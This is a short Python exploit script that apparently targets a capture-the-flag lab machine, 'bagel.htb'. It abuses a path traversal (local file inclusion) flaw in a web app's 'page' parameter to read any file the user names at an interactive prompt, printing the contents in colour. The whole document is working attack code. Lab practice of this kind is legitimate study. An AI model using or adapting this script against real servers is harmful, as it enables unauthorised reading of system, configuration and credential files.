import requests
from colorama import Fore, Style
import sys


def lfi(path):
    try:
        url = f'http://bagel.htb:8000/?page=../../../..{path}'
        r = requests.get(url)
        if r.status_code == 200:
            print(Fore.GREEN + r.text + Style.RESET_ALL)
        else:
            print(Fore.RED + f'{path} not found' + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f'error {e}' + Style.RESET_ALL)


def main():
    while True:
        path = input('[+] file >> ')
        if 'exit' in path:
            sys.exit(0)
        lfi(path)


if __name__ == '__main__':
    main()
